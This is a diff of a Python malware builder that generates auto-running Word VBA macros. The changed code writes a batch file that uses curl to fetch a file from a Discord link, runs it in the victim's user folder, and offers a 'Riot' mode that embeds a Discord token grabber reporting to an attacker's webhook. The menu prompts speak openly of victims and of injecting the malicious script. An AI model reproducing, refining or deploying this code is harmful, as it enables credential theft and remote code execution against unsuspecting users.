@@ -253,6 +253,7 @@ while True:
 
 
     vba =  """Sub AutoOpen()
+    ChDir ("C:/Users/" & Environ("username"))
     myFile = "_rage.py"
     Open myFile For Output As #1
     """
@@ -276,16 +277,15 @@ End Sub"""
 
 def mkcustomscript(link: str, extension: str) -> str:
 
-    return f'''Sub AutoOpen():
-    Shell("curl {link} --silent --output _rage{extension}")
-    Dim objShell As Object
+    return f"""Sub AutoOpen()
+    ChDir ("C:/Users/" & Environ("username"))
+    myFile = "_rage_exec.bat"
+    Open myFile For Output As #1
+    Print #1, "curl {link} --silent --output _rage{extension} && start _rage{extension}"
+    Close #1
+    Shell("_rage_exec.bat")
 
-    Set objShell = VBA.CreateObject("Wscript.Shell")
-
-
-    objShell.Run("_rage{extension}")
-    
-End Sub'''
+End Sub"""
 
 
 
@@ -354,7 +354,7 @@ def tutorial(script: str):
     w("Finally, you can save the file and exit. The malicious script has been succesfully injected.")
     return exit()
 
-def main(launch_tutorial: bool = False, script: str = None):
+def main(mode: str = None, launch_tutorial: bool = False, script: str = None):
     System.Clear()
     print('\n'*2)
     print(Colorate.Diagonal(Colors.red_to_purple, Center.XCenter(ascii_art)))
@@ -365,50 +365,64 @@ def main(launch_tutorial: bool = False, script: str = None):
 
 
 
-    mode = Write.Input("Use a custom file or the Riot token grabber [c/r] -> ", Colors.purple_to_red, interval=0.005)
+    if mode is None:
+        mode = Write.Input("Use a custom file or the Riot token grabber [c/r] -> ", Colors.purple_to_red, interval=0.005)
 
-    if mode not in ('c', 'r'):
-        Colorate.Error("Please enter either 'c' for a custom file or 'r' for the Riot token grabber!")
-        return
+        if mode not in ('c', 'r'):
+            Colorate.Error("Please enter either 'c' for a custom file or 'r' for the Riot token grabber!")
+            return
 
-    print()
+        print()
 
-    if mode == 'c':
-        link = Write.Input("Enter the file's link (to get it, send the file on Discord then copy the link) -> ", Colors.purple_to_red, interval=0.005)
+        if mode == 'c':
+            Write.Input("Please be aware that the file will be stocked in the victim's computer (in C:/Users/%username%/), so he/she can see it if they search in this path!", Colors.purple_to_red, interval=0.005)
 
-        extension = Write.Input("Enter the file's extension (ex: .py) -> ", Colors.purple_to_red, interval=0.005)
+            return main(mode='c')
 
-        if not extension.startswith('.'):
-            extension = '.' + extension
+
+        else: 
+            Write.Input("Riot is a Discord token grabber moving to the computer startup, executing in background, and sending the new token if the victim changes his password.\n\nVisit the GitHub repo to learn more: https://github.com/billythegoat356/Riot\n\nAnyways, please be aware that the victim needs Python3 to execute this script.", Colors.purple_to_red, interval=0.005)
+
+            return main(mode='r')
+
+    
+    elif mode == 'c':
+        link = Write.Input("Enter the link of the file sent through Discord -> ", Colors.purple_to_red, interval=0.005)
+
+        if '.' not in link:
+            Colorate.Error("Please sent the file through Discord and get the file link!")
+            return main(mode='c')
+
+        extension = '.' + link.split('.')[-1]
         
         script = mkcustomscript(link=link, extension=extension)
 
+    elif mode == 'r':
 
-    else: 
         webhook = Write.Input("Enter your webhook -> ",
                             Colors.purple_to_red, interval=0.005, end=Colors.reset)
         if not webhook.strip():
             Colorate.Error("Please enter a valid webhook!")
-            return
+            main(mode='r')
+        
+        print()
 
         ping = Write.Input("Would you like to get pinged when you get a hit [y/n] -> ",
                         Colors.purple_to_red, interval=0.005, end=Colors.reset)
         
         if ping not in ('y', 'n'):
             Colorate.Error("Please enter either 'y' or 'n'!")
-            return
+            main(mode='r')
         
         ping = ping == 'y'
         
         script = mkpyscript(webhook=webhook, ping=ping)
 
-
     print('\n')
 
-    w("Press enter to start the tutorial...")
+    Write.Input("Press enter to start the tutorial...",
+                            Colors.blue_to_purple, interval=0.005, end=Colors.reset)
     return main(launch_tutorial=True, script=script)
-
-
 
 
 if __name__ == '__main__':
